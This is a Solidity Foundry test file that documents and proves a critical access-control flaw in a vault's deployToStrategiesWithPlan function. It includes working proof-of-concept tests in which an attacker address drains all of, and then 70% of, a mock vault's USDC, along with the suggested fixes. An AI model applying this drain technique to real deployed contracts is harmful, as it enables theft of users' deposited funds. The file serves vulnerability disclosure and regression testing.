// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ──────────────────────────────────────────────────────────────────────────────
// SPRINT SECURITY TEST — deployToStrategiesWithPlan arbitrary-surplus drain
//
// VULNERABILITY SUMMARY
// ─────────────────────
// `LiquidityOpsModule.deployToStrategiesWithPlan` is registered as ROLE_PUBLIC
// (SelectorRegistry.sol:173-174, CoreHarness.sol:122-126).  It accepts a
// caller-supplied `IStrategyRouter.Allocation[] plan` and validates ONLY that
//
//     planTotal <= surplus          (LiquidityOpsModule.sol:645-648)
//
// before executing:
//
//     asset_.safeTransfer(plan[i].strat, plan[i].amount)   (LiquidityOpsModule.sol:669)
//
// There is NO validation that `plan[i].strat` is a registered or enabled
// strategy.  Any permissionless caller may therefore supply their own EOA (or
// any arbitrary contract) as `plan[i].strat` and receive the vault's full
// deployable surplus in one transaction.
//
// The safe on-chain path (`deployToStrategies`) routes through
// `r.planDeposit(surplus)` which only returns registered+enabled strategies,
// but `deployToStrategiesWithPlan` bypasses that guard entirely.
//
// SEVERITY:  Critical
// IMPACT:    Full drain of vault hot-surplus (up to 100 % of hot balance
//            depending on BufferManager config) by any EOA / bot.
//
// FIX OPTIONS (either):
//   A. Validate every leg:
//        require(r.isStrategyEnabled(plan[i].strat), "unregistered strategy");
//   B. Restrict selector to ROLE_KEEPER / ROLE_OWNER in SelectorRegistry.
// ──────────────────────────────────────────────────────────────────────────────

import { Test } from "lib/forge-std/src/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import { CoreHarness } from "../helpers/CoreHarness.sol";
import { MockUSDC } from "../helpers/MockUSDC.sol";
import { MockParamsProvider } from "../helpers/MockParamsProvider.sol";
import { MockBufferManagerForTests } from "../helpers/MockBufferManagerForTests.sol";
import { IBufferManager } from "../../src/interfaces/IBufferManager.sol";
import { IStrategyRouter } from "../../src/interfaces/IStrategyRouter.sol";
import { LiquidityOpsModule } from "../../src/core/modules/LiquidityOpsModule.sol";

// ─────────────────────────────────────────────────────────────────────────────
// Minimal mock strategy — satisfies StrategyRouter.register()'s asset() check.
// Has no real logic: deposit/withdraw are no-ops for the control test.
// ─────────────────────────────────────────────────────────────────────────────
contract MockStrategy {
    address private immutable _asset;
    uint256 private _total;

    constructor(address asset_) {
        _asset = asset_;
    }

    function asset() external view returns (address) {
        return _asset;
    }

    function totalAssets() external view returns (uint256) {
        return _total;
    }

    function name() external pure returns (string memory) {
        return "MockStrategy";
    }

    /// @dev Records the deposit (vault already transferred funds via safeTransfer)
    function deposit(uint256 amount) external returns (uint256) {
        _total += amount;
        return amount;
    }

    function withdraw(uint256 amount, address to) external returns (uint256) {
        IERC20(_asset).transfer(to, amount);
        _total = _total > amount ? _total - amount : 0;
        return amount;
    }

    function withdrawAll(address to) external returns (uint256) {
        uint256 bal = IERC20(_asset).balanceOf(address(this));
        if (bal > 0) IERC20(_asset).transfer(to, bal);
        _total = 0;
        return bal;
    }

    function harvest() external pure returns (int256, uint256) {
        return (0, 0);
    }

    function setActive(bool) external {}

    function isActive() external pure returns (bool) {
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
contract DeployToStrategiesWithPlan_Drain is Test {
    // ── canonical addresses ───────────────────────────────────────────────────
    address constant USDC_UNDERLYING = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;

    // ── scale constants ───────────────────────────────────────────────────────
    uint256 constant ONE_MILLION_USDC = 1_000_000e6;

    // ── actors ────────────────────────────────────────────────────────────────
    address internal attacker;

    // ── infra ─────────────────────────────────────────────────────────────────
    CoreHarness        internal core;
    MockUSDC           internal mock;
    MockParamsProvider internal params;
    MockStrategy       internal legitimateStrat; // registered, for the control test

    // ─────────────────────────────────────────────────────────────────────────
    function setUp() public {
        attacker = makeAddr("attacker");

        // 1. Etch MockUSDC at the canonical USDC address
        mock = new MockUSDC();
        vm.etch(USDC_UNDERLYING, address(mock).code);

        // 2. Deploy vault with all modules wired as ROLE_PUBLIC (test harness)
        params = new MockParamsProvider();
        core   = new CoreHarness(
            IERC20Metadata(USDC_UNDERLYING),
            "USDC Agg",
            "agUSDC",
            address(this), // owner
            address(this), // feeCollector / treasury
            address(params)
        );

        // 3. CoreHarness auto-installs MockBufferManagerForTests with a zero
        //    BufferConfig:
        //      opsReserveTargetBps = 0  →  no mandatory reserve
        //      maxWarmBps          = 0  →  no warm headroom
        //      ∴  surplus  =  hot − 0 − 0  =  entire vault hot balance  (100% drainable)

        // 4. Deploy a legitimate strategy and register it via the harness.
        //    addStrategyUnsafe auto-deploys a StrategyRouter (owner = CoreHarness).
        //    This gives _deployInternal a non-zero address(r) so the guard passes,
        //    AND it gives the safe on-chain path a real strategy to route to.
        legitimateStrat = new MockStrategy(USDC_UNDERLYING);
        core.addStrategyUnsafe(address(legitimateStrat));
    }

    // ── helpers ───────────────────────────────────────────────────────────────
    function _fundVault(uint256 amount) internal {
        MockUSDC(USDC_UNDERLYING).mint(address(core), amount);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 1 — PRIMARY EXPLOIT (zero-config BufferManager → 100 % drainable)
    //
    // Any unprivileged EOA can drain the vault's entire hot balance by
    // supplying their own address as plan[0].strat.
    //
    // Surplus derivation (zero-config BM, 1 M USDC vault):
    //   nav             = 1,000,000 USDC   (hot = 1M, warm = 0, strat = 0)
    //   reserveHot      = 0               (opsReserveTargetBps = 0)
    //   maxWarm         = 0               (maxWarmBps = 0)
    //   warmHeadroom    = 0
    //   surplus         = 1M − 0 − 0  =  1,000,000 USDC  ← 100 % of vault
    // ═════════════════════════════════════════════════════════════════════════
    function test_poc_attacker_drains_full_vault_zero_config() public {
        _fundVault(ONE_MILLION_USDC);

        uint256 vaultBefore    = IERC20(USDC_UNDERLYING).balanceOf(address(core));
        uint256 attackerBefore = IERC20(USDC_UNDERLYING).balanceOf(attacker);

        // Build malicious plan: one leg, dest = attacker EOA.
        // _deployInternal only checks planTotal <= surplus — no address validation.
        IStrategyRouter.Allocation[] memory plan = new IStrategyRouter.Allocation[](1);
        plan[0] = IStrategyRouter.Allocation({
            strat:                   attacker,        // ← arbitrary, unregistered address
            amount:                  ONE_MILLION_USDC,
            fundsAlreadyTransferred: false
        });

        // Anyone can invoke this — ROLE_PUBLIC, no ACL check.
        vm.prank(attacker);
        LiquidityOpsModule(address(core)).deployToStrategiesWithPlan(
            plan,
            ONE_MILLION_USDC
        );

        uint256 vaultAfter    = IERC20(USDC_UNDERLYING).balanceOf(address(core));
        uint256 attackerAfter = IERC20(USDC_UNDERLYING).balanceOf(attacker);

        assertEq(
            attackerAfter - attackerBefore,
            ONE_MILLION_USDC,
            "CRITICAL: attacker received the entire vault balance"
        );
        assertEq(
            vaultBefore - vaultAfter,
            ONE_MILLION_USDC,
            "CRITICAL: vault was fully drained"
        );
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 2 — PARTIAL DRAIN (production-realistic BufferManager config)
    //
    // Even with sane production parameters the exploit is viable at scale.
    //
    // Config:
    //   opsReserveTargetBps = 1000  (10 % reserve  → floor $100 k on $1 M vault)
    //   maxWarmBps          = 2000  (20 % max warm  → cap  $200 k on $1 M vault)
    //
    // Surplus derivation (1 M vault, warm = 0):
    //   reserveHot      = 1M × 10%  = 100,000 USDC
    //   maxWarm         = 1M × 20%  = 200,000 USDC
    //   warmHeadroom    = 200,000 USDC
    //   excessAfterRes. = 1M − 100k = 900,000 USDC
    //   toWarm          = min(900k, 200k) = 200,000 USDC
    //   surplus         = 900k − 200k   = 700,000 USDC  ← 70 % drained
    // ═════════════════════════════════════════════════════════════════════════
    function test_poc_attacker_drains_700k_with_realistic_config() public {
        // Replace the default zero-config BM with one that has realistic params
        MockBufferManagerForTests realisticBm =
            new MockBufferManagerForTests(address(core));

        IBufferManager.BufferConfig memory cfg;
        cfg.opsReserveTargetBps = 1000; // 10 % ops reserve
        cfg.maxWarmBps          = 2000; // 20 % max warm
        // asset left as address(0) so setBufferManagerUnsafe skips the mismatch guard
        realisticBm.setBufferConfig(cfg);
        core.setBufferManagerUnsafe(address(realisticBm));

        _fundVault(ONE_MILLION_USDC);

        uint256 expectedSurplus = 700_000e6; // 70 % of vault

        uint256 vaultBefore    = IERC20(USDC_UNDERLYING).balanceOf(address(core));
        uint256 attackerBefore = IERC20(USDC_UNDERLYING).balanceOf(attacker);

        IStrategyRouter.Allocation[] memory plan = new IStrategyRouter.Allocation[](1);
        plan[0] = IStrategyRouter.Allocation({
            strat:                   attacker,
            amount:                  expectedSurplus,
            fundsAlreadyTransferred: false
        });

        vm.prank(attacker);
        LiquidityOpsModule(address(core)).deployToStrategiesWithPlan(
            plan,
            expectedSurplus
        );

        uint256 vaultAfter    = IERC20(USDC_UNDERLYING).balanceOf(address(core));
        uint256 attackerAfter = IERC20(USDC_UNDERLYING).balanceOf(attacker);

        assertEq(
            attackerAfter - attackerBefore,
            expectedSurplus,
            "CRITICAL: attacker drained 700,000 USDC (70%) from a 1M vault"
        );
        assertEq(
            vaultBefore - vaultAfter,
            expectedSurplus,
            "Vault lost 70 % of its assets"
        );
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 3 — CONTROL: safe on-chain path cannot be weaponised
    //
    // `deployToStrategies` (no external plan) uses r.planDeposit() which only
    // returns registered+enabled strategies.  The attacker calling this variant
    // cannot redirect funds to themselves: funds flow only to legitimateStrat.
    //
    // This demonstrates the asymmetry — the vulnerability is specific to the
    // external-plan path, not to the function's access level per se.
    // ═════════════════════════════════════════════════════════════════════════
    function test_control_safe_path_routes_to_registered_strategy_only() public {
        _fundVault(ONE_MILLION_USDC);

        uint256 stratBefore   = IERC20(USDC_UNDERLYING).balanceOf(address(legitimateStrat));
        uint256 attackerBefore = IERC20(USDC_UNDERLYING).balanceOf(attacker);

        // Attacker calls the on-chain path hoping to influence routing — they cannot.
        vm.prank(attacker);
        LiquidityOpsModule(address(core)).deployToStrategies(ONE_MILLION_USDC);

        uint256 attackerAfter = IERC20(USDC_UNDERLYING).balanceOf(attacker);
        uint256 stratAfter    = IERC20(USDC_UNDERLYING).balanceOf(address(legitimateStrat));

        // Attacker receives nothing
        assertEq(
            attackerAfter - attackerBefore,
            0,
            "On-chain path must never transfer to an unregistered caller"
        );

        // Funds flowed to the legitimately registered strategy
        assertGt(
            stratAfter - stratBefore,
            0,
            "On-chain path routed to the registered strategy as expected"
        );
    }
}
